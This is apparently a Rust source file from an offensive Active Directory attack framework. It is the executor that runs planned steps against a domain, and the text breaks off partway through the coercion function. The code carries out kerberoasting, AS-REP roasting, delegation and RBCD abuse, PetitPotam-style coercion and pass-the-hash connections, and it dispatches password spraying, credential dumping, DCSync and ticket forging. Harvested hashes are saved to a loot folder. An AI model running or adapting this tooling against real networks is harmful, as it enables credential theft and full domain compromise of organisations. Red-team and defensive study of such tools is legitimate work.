//! Step executor — Takes a single PlanStep and executes it against
//! the target environment using the appropriate overthrone crate.
//!
//! The executor translates PlannedActions into actual API calls to
//! overthrone-core, overthrone-hunter, overthrone-crawler, etc.

use crate::goals::{
    CompromisedCred, DelegationInfo, DiscoveredComputer, DiscoveredUser, EngagementState, LootItem,
    SecretType,
};
use crate::planner::{PlanStep, PlannedAction, StepResult};
use chrono::Utc;
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::{kerberos, ldap, smb::SmbSession};
use overthrone_hunter::HuntConfig;
use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod};
use overthrone_hunter::constrained::ConstrainedConfig;
use overthrone_hunter::rbcd::RbcdConfig;
use overthrone_hunter::unconstrained::UnconstrainedConfig;
use std::path::PathBuf;
use tracing::{debug, info, warn};
// ═══════════════════════════════════════════════════════════
// Execution Context — holds auth and connection info
// ═══════════════════════════════════════════════════════════

/// Everything the executor needs to run actions
#[derive(Debug, Clone)]
pub struct ExecContext {
    pub dc_ip: String,
    pub domain: String,
    pub username: String,
    pub secret: String,
    pub use_hash: bool,
    pub use_ldaps: bool,
    pub timeout: u64,
    pub jitter_ms: u64,
    pub dry_run: bool,
    /// Override credentials (e.g., use a newly compromised account)
    pub override_creds: Option<(String, String, bool)>,
    /// Whether LDAP connectivity has been verified (set to false if pre-flight check fails)
    pub ldap_available: bool,
    /// Preferred remote execution method (smbexec, wmiexec, winrmexec, psexec)
    pub preferred_method: String,
}

impl ExecContext {
    /// Get effective credentials (override if set)
    pub fn effective_creds(&self) -> (&str, &str, bool) {
        if let Some((ref u, ref s, h)) = self.override_creds {
            (u, s, h)
        } else {
            (&self.username, &self.secret, self.use_hash)
        }
    }

    /// Base DN derived from domain
    pub fn base_dn(&self) -> String {
        self.domain
            .split('.')
            .map(|p| format!("DC={p}"))
            .collect::<Vec<_>>()
            .join(",")
    }

    /// Apply jitter delay
    pub async fn jitter(&self) {
        if self.jitter_ms > 0 {
            let ms = rand::random::<u64>() % self.jitter_ms;
            tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
        }
    }

    /// Build a HuntConfig from this ExecContext for overthrone-hunter calls
    pub fn to_hunt_config(&self) -> HuntConfig {
        let (user, secret, use_hash) = self.effective_creds();
        HuntConfig {
            dc_ip: self.dc_ip.clone(),
            domain: self.domain.clone(),
            username: user.to_string(),
            secret: secret.to_string(),
            use_hash,
            base_dn: None,
            use_ldaps: self.use_ldaps,
            output_dir: PathBuf::from("./loot"),
            concurrency: 10,
            timeout: self.timeout,
            jitter_ms: self.jitter_ms,
            tgt: None,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Main Dispatch
// ═══════════════════════════════════════════════════════════

/// Execute a plan step, updating the engagement state with results
pub async fn execute_step(
    step: &PlanStep,
    ctx: &ExecContext,
    state: &mut EngagementState,
) -> StepResult {
    info!("{} {}", "▶".cyan(), step.description.bold());

    if ctx.dry_run {
        info!("{}", "  DRY RUN — skipping execution".dimmed());
        state.log_action(
            &step.stage.to_string(),
            &step.description,
            "",
            true,
            "dry run",
        );
        return StepResult {
            success: true,
            output: "dry run".to_string(),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    // Check if step requires LDAP and LDAP is unavailable
    let requires_ldap = matches!(
        &step.action,
        PlannedAction::EnumerateUsers
            | PlannedAction::EnumerateComputers
            | PlannedAction::EnumerateGroups
            | PlannedAction::EnumerateTrusts
            | PlannedAction::EnumerateGpos
            | PlannedAction::AdcsEnumerate
            | PlannedAction::AdcsEsc4 { .. }
    );
    if requires_ldap && !ctx.ldap_available {
        let msg = format!("Skipped: LDAP authentication failed — {}", step.description);
        warn!("{}", msg);
        state.log_action(&step.stage.to_string(), &step.description, "", false, &msg);
        return StepResult {
            success: false,
            output: msg,
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    let result = match &step.action {
        PlannedAction::EnumerateUsers => exec_enumerate_users(ctx, state).await,
        PlannedAction::EnumerateComputers => exec_enumerate_computers(ctx, state).await,
        PlannedAction::EnumerateGroups => exec_enumerate_groups(ctx, state).await,
        PlannedAction::EnumerateTrusts => exec_enumerate_trusts(ctx, state).await,
        PlannedAction::EnumerateGpos => exec_enumerate_gpos(ctx, state).await,
        PlannedAction::EnumerateShares { target } => {
            exec_enumerate_shares(ctx, state, target).await
        }
        PlannedAction::CheckAdminAccess { targets } => exec_check_admin(ctx, state, targets).await,
        PlannedAction::AsRepRoast { users } => exec_asrep_roast(ctx, state, users).await,
        PlannedAction::Kerberoast { spns } => exec_kerberoast(ctx, state, spns).await,
        PlannedAction::ConstrainedDelegation {
            account,
            target_spn,
            impersonate,
        } => exec_constrained_delegation(ctx, state, account, target_spn, impersonate).await,
        PlannedAction::RbcdAttack { controlled, target } => {
            exec_rbcd(ctx, state, controlled, target).await
        }
        PlannedAction::UnconstrainedDelegation { target_host } => {
            exec_unconstrained_delegation(ctx, state, target_host).await
        }
        PlannedAction::PasswordSpray { users, password } => {
            exec_password_spray(ctx, state, users, password).await
        }
        PlannedAction::SmbExec { target, command } => {
            exec_smbexec(ctx, state, target, command).await
        }
        PlannedAction::PsExec { target, command } => exec_psexec(ctx, state, target, command).await,
        PlannedAction::WmiExec { target, command } => {
            exec_wmiexec(ctx, state, target, command).await
        }
        PlannedAction::WinRmExec { target, command } => {
            exec_winrmexec(ctx, state, target, command).await
        }
        PlannedAction::ExecCommand {
            target,
            command,
            method,
        } => exec_generic(ctx, state, target, command, method).await,
        PlannedAction::DumpSam { target } => exec_dump_sam(ctx, state, target).await,
        PlannedAction::DumpLsa { target } => exec_dump_lsa(ctx, state, target).await,
        PlannedAction::DumpNtds { target } => exec_dump_ntds(ctx, state, target).await,
        PlannedAction::DumpDcc2 { target } => exec_dump_dcc2(ctx, state, target).await,
        PlannedAction::DcsSync { target_user } => {
            exec_dcsync(ctx, state, target_user.as_deref()).await
        }
        PlannedAction::Coerce { target, listener } => {
            exec_coerce(ctx, state, target, listener).await
        }
        PlannedAction::AdcsEnumerate => exec_adcs_enumerate(ctx, state).await,
        PlannedAction::AdcsEsc1 {
            template,
            ca,
            target_upn,
        } => exec_adcs_esc1(ctx, state, template, ca, target_upn).await,
        PlannedAction::AdcsEsc4 { template } => exec_adcs_esc4(ctx, state, template).await,
        PlannedAction::AdcsEsc6 {
            template,
            ca,
            target_upn,
        } => exec_adcs_esc6(ctx, state, template, ca, target_upn).await,
        PlannedAction::ForgeGoldenTicket { krbtgt_hash } => {
            exec_golden_ticket(ctx, state, krbtgt_hash).await
        }
        PlannedAction::ForgeSilverTicket { service_hash, spn } => {
            exec_silver_ticket(ctx, state, service_hash, spn).await
        }
        PlannedAction::CrackHashes { hashes } => exec_crack_hashes(ctx, state, hashes).await,
        PlannedAction::RunPlaybook { playbook_id } => {
            // Playbooks are expanded by the runner, not the executor
            StepResult {
                success: true,
                output: format!("Playbook {playbook_id} dispatched to runner"),
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
        PlannedAction::Sleep { seconds } => {
            info!("{}", format!("  Sleeping for {seconds}s").dimmed());
            tokio::time::sleep(tokio::time::Duration::from_secs(*seconds)).await;
            StepResult {
                success: true,
                output: format!("Slept {seconds}s"),
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
        PlannedAction::Checkpoint { message } => {
            info!("  {} {}", "CHECKPOINT".yellow(), message);
            StepResult {
                success: true,
                output: message.clone(),
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
    };

    // Log the action
    state.log_action(
        &step.stage.to_string(),
        &step.description,
        "",
        result.success,
        &result.output,
    );

    result
}

// ═══════════════════════════════════════════════════════════
// LDAP Connection Helper
// ═══════════════════════════════════════════════════════════

/// Connect to LDAP using the effective credentials from the ExecContext.
/// When `use_hash` is true (pass-the-hash mode), LDAP simple bind cannot
/// work — the password field holds an NT hash, not a cleartext password.
/// In that case we check for a known cleartext among cracked credentials
/// or return a clear error instead of sending garbage to the DC.
async fn ldap_connect(
    ctx: &ExecContext,
    state: &EngagementState,
) -> std::result::Result<ldap::LdapSession, StepResult> {
    let (user, secret, use_hash) = ctx.effective_creds();

    // If the operator authenticated with an NT hash, LDAP simple bind will
    // fail.  Try to find a plaintext password for the same account first.
    let password: String = if use_hash {
        // Check cracked / known cleartext passwords
        if let Some(cleartext) = state.cracked.get(user) {
            debug!(
                "LDAP: using cracked cleartext for {} instead of NT hash",
                user
            );
            cleartext.clone()
        } else if let Some(cred) = state.credentials.get(user) {
            if cred.secret_type == SecretType::Password {
                debug!("LDAP: using stored password for {}", user);
                cred.secret.clone()
            } else {
                return Err(StepResult {
                    success: false,
                    output: format!(
                        "LDAP simple bind requires a password, but only an NT hash is available for '{}'. \
                         Crack the hash or provide plaintext credentials.",
                        user
                    ),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                });
            }
        } else {
            return Err(StepResult {
                success: false,
                output: format!(
                    "LDAP simple bind cannot authenticate with an NT hash (user: '{}'). \
                     Use --password or crack the hash first.",
                    user
                ),
                new_credentials: 0,
                new_admin_hosts: 0,
            });
        }
    } else {
        secret.to_string()
    };

    match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, &password, ctx.use_ldaps).await
    {
        Ok(conn) => Ok(conn),
        Err(e) => Err(StepResult {
            success: false,
            output: format!("LDAP connect failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        }),
    }
}

// ═══════════════════════════════════════════════════════════
// SMB Connection Helper (pass-the-hash aware)
// ═══════════════════════════════════════════════════════════

/// Connect to a target via SMB, correctly handling pass-the-hash mode.
/// When `use_hash` is true, calls `SmbSession::connect_with_hash()` instead
/// of `SmbSession::connect()` so the NT hash is used for NTLMv2 auth
/// rather than being sent as a literal password string.
async fn smb_connect(
    ctx: &ExecContext,
    target: &str,
) -> std::result::Result<SmbSession, StepResult> {
    let (user, secret, use_hash) = ctx.effective_creds();
    let result = if use_hash {
        SmbSession::connect_with_hash(target, &ctx.domain, user, secret).await
    } else {
        SmbSession::connect(target, &ctx.domain, user, secret).await
    };
    result.map_err(|e| StepResult {
        success: false,
        output: format!("SMB connect to {}: {e}", target),
        new_credentials: 0,
        new_admin_hosts: 0,
    })
}

// ═══════════════════════════════════════════════════════════
// Enumeration Executors
// ═══════════════════════════════════════════════════════════

async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
    let mut conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    let ad_users = match conn.enumerate_users().await {
        Ok(u) => u,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("LDAP user enumeration failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let _ = conn.disconnect().await;

    let mut user_count = 0;
    for u in &ad_users {
        if !u.service_principal_names.is_empty()
            && u.sam_account_name.to_lowercase() != "krbtgt"
            && !u.sam_account_name.ends_with("$")
        {
            state.kerberoastable.push(u.sam_account_name.clone());
            state.spn_map.insert(
                u.sam_account_name.clone(),
                u.service_principal_names.clone(),
            );
        }
        if u.dont_req_preauth {
            state.asrep_roastable.push(u.sam_account_name.clone());
        }
        state.users.push(DiscoveredUser {
            sam_account_name: u.sam_account_name.clone(),
            distinguished_name: u.distinguished_name.clone(),
            admin_count: u.admin_count,
            has_spn: !u.service_principal_names.is_empty(),
            dont_req_preauth: u.dont_req_preauth,
            enabled: u.enabled,
            description: u.description.clone(),
        });
        user_count += 1;
    }

    let admin_users = state.users.iter().filter(|u| u.admin_count).count();
    let msg = format!(
        "Enumerated {} users ({} admin, {} kerberoastable, {} AS-REP)",
        user_count,
        admin_users,
        state.kerberoastable.len(),
        state.asrep_roastable.len()
    );
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
    let mut conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    let ad_computers = match conn.enumerate_computers().await {
        Ok(c) => c,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("Search: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let _ = conn.disconnect().await;

    let mut dc_count = 0;
    for c in &ad_computers {
        let is_dc = (c.user_account_control & 0x2000) != 0;
        let unconstrained = c.unconstrained_delegation && !is_dc;

        if is_dc {
            dc_count += 1;
            if state.dc_hostname.is_none() {
                state.dc_hostname = c.dns_hostname.clone();
            }
        }
        if unconstrained {
            state.unconstrained_delegation.push(
                c.dns_hostname
                    .clone()
                    .unwrap_or_else(|| c.sam_account_name.clone()),
            );
        }

        state.computers.push(DiscoveredComputer {
            sam_account_name: c.sam_account_name.clone(),
            dns_hostname: c.dns_hostname.clone(),
            operating_system: c.operating_system.clone(),
            unconstrained_delegation: unconstrained,
            is_dc,
        });
    }

    // ── RBCD target discovery ──
    // Try to find computers where we may have GenericWrite (RBCD pre-requisite).
    // Heuristic 1: Computers we created (mS-DS-CreatorSID set → we have full control)
    // Heuristic 2: Computers with existing msDS-AllowedToActOnBehalfOfOtherIdentity
    if let Ok(mut rbcd_conn) = ldap_connect(ctx, state).await {
        let filter = "(&(objectClass=computer)(mS-DS-CreatorSID=*))";
        if let Ok(entries) = rbcd_conn
            .custom_search(filter, &["sAMAccountName", "dNSHostName"])
            .await
        {
            for entry in &entries {
                let host = entry
                    .attrs
                    .get("dNSHostName")
                    .and_then(|v| v.first())
                    .or_else(|| entry.attrs.get("sAMAccountName").and_then(|v| v.first()))
                    .cloned()
                    .unwrap_or_default();
                if !host.is_empty() {
                    state.rbcd_targets.push(host.clone());
                    debug!("  RBCD candidate (creator-owned): {}", host);
                }
            }
        }

        let filter2 = "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))";
        if let Ok(entries) = rbcd_conn
            .custom_search(filter2, &["sAMAccountName", "dNSHostName"])
            .await
        {
            for entry in &entries {
                let host = entry
                    .attrs
                    .get("dNSHostName")
                    .and_then(|v| v.first())
                    .or_else(|| entry.attrs.get("sAMAccountName").and_then(|v| v.first()))
                    .cloned()
                    .unwrap_or_default();
                if !host.is_empty() && !state.rbcd_targets.contains(&host) {
                    state.rbcd_targets.push(host.clone());
                    debug!("  RBCD candidate (existing delegation): {}", host);
                }
            }
        }

        let _ = rbcd_conn.disconnect().await;

        if !state.rbcd_targets.is_empty() {
            info!(
                "  {} {} RBCD-writable computer(s) identified",
                "⚠".yellow(),
                state.rbcd_targets.len()
            );
        }
    }

    let msg = format!(
        "Enumerated {} computers ({} DCs, {} unconstrained)",
        state.computers.len(),
        dc_count,
        state.unconstrained_delegation.len()
    );
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_enumerate_groups(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
    let mut conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    let ad_groups = match conn.enumerate_groups().await {
        Ok(g) => g,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("{e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let _ = conn.disconnect().await;

    for g in &ad_groups {
        state
            .groups
            .insert(g.sam_account_name.clone(), g.members.clone());
    }

    let msg = format!("Enumerated {} groups", state.groups.len());
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_enumerate_trusts(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
    let mut conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    let trusts = match conn.enumerate_trusts().await {
        Ok(t) => t,
        Err(e) => {
            let _ = conn.disconnect().await;
            return StepResult {
                success: false,
                output: format!("Trust enum failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let _ = conn.disconnect().await;

    let mut trust_info = Vec::new();
    for t in &trusts {
        info!(
            "  {} {} ({}, {})",
            "⤷".cyan(),
            t.trust_partner.bold(),
            t.trust_direction,
            t.trust_type
        );
        trust_info.push(format!(
            "{} ({}, {})",
            t.trust_partner, t.trust_direction, t.trust_type
        ));
    }

    let msg = format!(
        "Enumerated {} domain trusts: [{}]",
        trusts.len(),
        trust_info.join(", ")
    );
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_enumerate_gpos(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
    let mut conn = match ldap_connect(ctx, state).await {
        Ok(c) => c,
        Err(e) => return e,
    };

    // Query groupPolicyContainer objects
    let filter = "(objectClass=groupPolicyContainer)";
    let attrs = &["displayName", "gPCFileSysPath", "cn", "whenChanged"];
    let entries = match conn.custom_search(filter, attrs).await {
        Ok(e) => e,
        Err(e) => {
            let _ = conn.disconnect().await;
            return StepResult {
                success: false,
                output: format!("GPO enum failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let _ = conn.disconnect().await;

    let mut gpo_names = Vec::new();
    for entry in &entries {
        if let Some(name) = entry.attrs.get("displayName").and_then(|v| v.first()) {
            let sysvol = entry
                .attrs
                .get("gPCFileSysPath")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_default();
            info!("  {} {} → {}", "⤷".cyan(), name.bold(), sysvol.dimmed());
            gpo_names.push(name.clone());
        }
    }

    let msg = format!(
        "Enumerated {} GPOs: [{}]",
        entries.len(),
        gpo_names.join(", ")
    );
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_enumerate_shares(
    ctx: &ExecContext,
    _state: &mut EngagementState,
    target: &str,
) -> StepResult {
    match smb_connect(ctx, target).await {
        Ok(smb) => {
            let shares = smb
                .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON"])
                .await;
            let readable: Vec<_> = shares
                .iter()
                .filter(|s| s.readable)
                .map(|s| &s.share_name)
                .collect();
            let msg = format!(
                "Shares on {}: {} readable {:?}",
                target,
                readable.len(),
                readable
            );
            info!("{} {}", "  ✓".green(), msg);
            StepResult {
                success: true,
                output: msg,
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
        Err(e) => e,
    }
}

async fn exec_check_admin(
    ctx: &ExecContext,
    state: &mut EngagementState,
    targets: &[String],
) -> StepResult {
    let mut new_admin = 0;

    for target in targets {
        match smb_connect(ctx, target).await {
            Ok(smb) => {
                let result = smb.check_admin_access().await;
                if result.has_admin {
                    state.admin_hosts.insert(target.clone());
                    new_admin += 1;
                    info!("  {} Admin on {}", "✓".green(), target.bold());
                }
            }
            Err(e) => {
                debug!("  ✗ {} — {}", target, e.output);
            }
        }
        ctx.jitter().await;
    }

    let msg = format!("Admin check: {} hosts accessible", state.admin_hosts.len());
    StepResult {
        success: true,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: new_admin,
    }
}

// ═══════════════════════════════════════════════════════════
// Kerberos Attack Executors
// ═══════════════════════════════════════════════════════════

async fn exec_kerberoast(
    ctx: &ExecContext,
    state: &mut EngagementState,
    _spns: &[String],
) -> StepResult {
    let (user, pass, use_hash) = ctx.effective_creds();

    // Get TGT first
    let tgt = match kerberos::request_tgt(&ctx.dc_ip, &ctx.domain, user, pass, use_hash).await {
        Ok(t) => t,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("TGT failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let targets = state.kerberoastable.clone();
    if targets.is_empty() {
        return StepResult {
            success: true,
            output: "No kerberoastable accounts found".to_string(),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    let mut hash_count = 0;
    for account in &targets {
        // Look up real SPNs from LDAP enumeration
        let spns = match state.spn_map.get(account) {
            Some(s) if !s.is_empty() => s.clone(),
            _ => {
                // No SPNs discovered for this account — skip rather than
                // fabricating a fake SPN that will always fail.
                debug!(
                    "  {} {} has no SPNs in spn_map, skipping",
                    "→".dimmed(),
                    account
                );
                continue;
            }
        };

        for spn in &spns {
            match kerberos::kerberoast(&ctx.dc_ip, &tgt, spn).await {
                Ok(hash) => {
                    info!(
                        "  {} Kerberoast hash: {} ({})",
                        "✓".green(),
                        account.bold(),
                        spn
                    );
                    state.roast_hashes.push(hash.hash_string.clone());
                    hash_count += 1;
                    break; // One hash per account is sufficient
                }
                Err(e) => {
                    debug!("{} {} {} {}", "  ✗".dimmed(), account, spn, e);
                }
            }
        }
        ctx.jitter().await;
    }

    // Write hashes to loot directory for offline cracking
    if hash_count > 0 {
        let loot_dir = std::path::PathBuf::from("./loot");
        let _ = std::fs::create_dir_all(&loot_dir);
        let hash_file = loot_dir.join("kerberoast_hashes.txt");
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&hash_file)
        {
            use std::io::Write;
            for h in state
                .roast_hashes
                .iter()
                .skip(state.roast_hashes.len().saturating_sub(hash_count))
            {
                let _ = writeln!(f, "{}", h);
            }
            info!(
                "  {} Wrote {} hashes to {}",
                "→".cyan(),
                hash_count,
                hash_file.display()
            );
        }
    }

    let msg = format!(
        "Kerberoast: {} hashes from {} targets",
        hash_count,
        targets.len()
    );
    StepResult {
        success: hash_count > 0,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

async fn exec_asrep_roast(
    ctx: &ExecContext,
    state: &mut EngagementState,
    _users: &[String],
) -> StepResult {
    let targets = state.asrep_roastable.clone();
    if targets.is_empty() {
        return StepResult {
            success: true,
            output: "No AS-REP roastable accounts".to_string(),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    let mut hash_count = 0;
    for user in &targets {
        match kerberos::asrep_roast(&ctx.dc_ip, &ctx.domain, user).await {
            Ok(hash) => {
                info!("  {} AS-REP hash: {}", "✓".green(), user.bold());
                state.roast_hashes.push(hash.hash_string.clone());
                hash_count += 1;
            }
            Err(e) => {
                debug!("{} {} {}", "  ✗".dimmed(), user, e);
            }
        }
        ctx.jitter().await;
    }

    // Write AS-REP hashes to loot directory
    if hash_count > 0 {
        let loot_dir = std::path::PathBuf::from("./loot");
        let _ = std::fs::create_dir_all(&loot_dir);
        let hash_file = loot_dir.join("asrep_hashes.txt");
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&hash_file)
        {
            use std::io::Write;
            for h in state
                .roast_hashes
                .iter()
                .skip(state.roast_hashes.len().saturating_sub(hash_count))
            {
                let _ = writeln!(f, "{}", h);
            }
            info!(
                "  {} Wrote {} hashes to {}",
                "→".cyan(),
                hash_count,
                hash_file.display()
            );
        }
    }

    let msg = format!(
        "AS-REP Roast: {} hashes from {} targets",
        hash_count,
        targets.len()
    );
    StepResult {
        success: hash_count > 0,
        output: msg,
        new_credentials: 0,
        new_admin_hosts: 0,
    }
}

// ═══════════════════════════════════════════════════════════
// Delegation Attack Executors (wired to overthrone-hunter)
// ═══════════════════════════════════════════════════════════

async fn exec_constrained_delegation(
    ctx: &ExecContext,
    state: &mut EngagementState,
    account: &str,
    target_spn: &str,
    impersonate: &str,
) -> StepResult {
    let hunt_config = ctx.to_hunt_config();
    let cc = ConstrainedConfig {
        source_account: Some(account.to_string()),
        impersonate_user: impersonate.to_string(),
        target_spn: Some(target_spn.to_string()),
        enumerate_only: false,
        export_tickets: false,
    };

    match overthrone_hunter::constrained::run(&hunt_config, &cc).await {
        Ok(result) => {
            let successful = result.s4u_chains.iter().filter(|c| c.success).count();

            // Register delegation findings in state
            for acct in &result.delegatable_accounts {
                state.constrained_delegation.push(DelegationInfo {
                    account: acct.sam_account_name.clone(),
                    delegation_type: if acct.protocol_transition {
                        "constrained_t2a4d".to_string()
                    } else {
                        "constrained".to_string()
                    },
                    targets: acct.allowed_to_delegate_to.clone(),
                    protocol_transition: acct.protocol_transition,
                });
            }

            // If S4U succeeded, we effectively have admin on the target service
            for chain in &result.s4u_chains {
                if chain.success {
                    // Extract hostname from SPN (e.g., "cifs/dc01.corp.local" → "dc01.corp.local")
                    if let Some(host) = chain.target_spn.split('/').nth(1) {
                        state.admin_hosts.insert(host.to_string());
                    }
                    info!(
                        "  {} S4U chain: {} → {} as {}",
                        "✓".green(),
                        chain.source_account.bold(),
                        chain.target_spn.cyan(),
                        chain.impersonated_user.red()
                    );
                }
            }

            let msg = format!(
                "Constrained delegation: {}/{} S4U chains succeeded ({} delegatable accounts)",
                successful,
                result.s4u_chains.len(),
                result.delegatable_accounts.len()
            );
            info!("{} {}", "  ✓".green(), msg);
            StepResult {
                success: successful > 0,
                output: msg,
                new_credentials: 0,
                new_admin_hosts: successful,
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("Constrained delegation failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

async fn exec_rbcd(
    ctx: &ExecContext,
    state: &mut EngagementState,
    controlled: &str,
    target: &str,
) -> StepResult {
    let hunt_config = ctx.to_hunt_config();

    // Resolve controlled account's SID from LDAP
    let controlled_sid = {
        let mut conn = match ldap_connect(ctx, state).await {
            Ok(c) => c,
            Err(e) => return e,
        };

        let filter = format!(
            "(sAMAccountName={})",
            if controlled.ends_with('$') {
                controlled.to_string()
            } else {
                format!("{}$", controlled)
            }
        );
        let results = match conn.custom_search(&filter, &["objectSid"]).await {
            Ok(r) => r,
            Err(e) => {
                return StepResult {
                    success: false,
                    output: format!("SID lookup failed: {e}"),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        };
        let _ = conn.disconnect().await;

        match results
            .first()
            .and_then(|entry| entry.bin_attrs.get("objectSid"))
            .and_then(|sids| sids.first())
            .map(|bytes| parse_sid_bytes(bytes))
        {
            Some(sid) => sid,
            None => {
                return StepResult {
                    success: false,
                    output: format!(
                        "Could not resolve objectSid for '{}' via LDAP — RBCD requires a valid SID",
                        controlled
                    ),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        }
    };

    let rc = RbcdConfig {
        controlled_account: controlled.to_string(),
        controlled_sid,
        target_computer: target.to_string(),
        impersonate_user: "Administrator".to_string(),
        target_spn: None, // Auto-derives cifs/<target>
        write_only: false,
        cleanup: true,
        controlled_secret: Some(ctx.effective_creds().1.to_string()),
        controlled_use_hash: ctx.effective_creds().2,
    };

    match overthrone_hunter::rbcd::run(&hunt_config, &rc).await {
        Ok(result) => {
            let mut new_admin = 0;
            if result.success {
                state.admin_hosts.insert(target.to_string());
                new_admin = 1;
                info!(
                    "  {} RBCD: {} → {} (impersonating Administrator)",
                    "✓".green(),
                    controlled.bold(),
                    target.red()
                );
            }

            let msg = format!(
                "RBCD attack on {}: attr_written={}, s4u={}, cleanup={}",
                target, result.attribute_written, result.s4u_success, result.cleaned_up
            );
            info!(
                "{} {}",
                if result.success {
                    "  ✓".green()
                } else {
                    "  ✗".red()
                },
                msg
            );
            StepResult {
                success: result.success,
                output: msg,
                new_credentials: 0,
                new_admin_hosts: new_admin,
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("RBCD attack failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

async fn exec_unconstrained_delegation(
    ctx: &ExecContext,
    state: &mut EngagementState,
    _target_host: &str,
) -> StepResult {
    let hunt_config = ctx.to_hunt_config();
    let uc = UnconstrainedConfig {
        include_dcs: false,
        check_reachability: true,
        target_ous: Vec::new(),
    };

    match overthrone_hunter::unconstrained::run(&hunt_config, &uc).await {
        Ok(result) => {
            // Update state with discovered unconstrained delegation hosts
            for host in &result.vulnerable_hosts {
                if !state.unconstrained_delegation.contains(
                    &host
                        .dns_hostname
                        .clone()
                        .unwrap_or(host.sam_account_name.clone()),
                ) {
                    state.unconstrained_delegation.push(
                        host.dns_hostname
                            .clone()
                            .unwrap_or(host.sam_account_name.clone()),
                    );
                }
            }

            let reachable = result
                .vulnerable_hosts
                .iter()
                .filter(|h| h.is_reachable == Some(true))
                .count();

            let msg = format!(
                "Unconstrained delegation: {} vulnerable hosts ({} reachable), {} DCs",
                result.vulnerable_hosts.len(),
                reachable,
                result.domain_controllers.len()
            );
            info!("{} {}", "  ✓".green(), msg);
            StepResult {
                success: !result.vulnerable_hosts.is_empty(),
                output: msg,
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("Unconstrained delegation failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

// ═══════════════════════════════════════════════════════════
// Coercion Executor (wired to overthrone-hunter)
// ═══════════════════════════════════════════════════════════

async fn exec_coerce(
    ctx: &ExecContext,
    _state: &mut EngagementState,
    target: &str,
    listener: &str,
) -> StepResult {
    let hunt_config = ctx.to_hunt_config();
    let cc = CoerceConfig {
        target: target.to_string(),
        listener: listener.to_string(),
        listener_port: 445,
        methods: vec![
            CoerceMethod::PetitPotam,
            CoerceMethod::PrinterBug,
            CoerceMethod::DfsCoerce,
        ],
        listener_path: None,
    };

    match overthrone_hunter::coerce::run(&hunt_config, &cc).await {
        Ok(result) => {
            let success_count = result.successful_coercions.len();
            for coercion in &result.successful_coercions {
                info!(
                    "  {} Coercion triggered: {} via {}",
                    "✓".green(),
                    target.bold(),
                    coercion.method.cyan()
                );
            }

            let msg = format!(
                "Coercion on {}: {}/{} methods triggered auth to {}",
                target, success_count, result.methods_attempted, listener
            );
            StepResult {
                success: success_count > 0,
                output: msg,
                new_credentials: 0,
                new_admin_hosts: 0,
            }
        }
        Err(e) => StepResult {
            success: false,
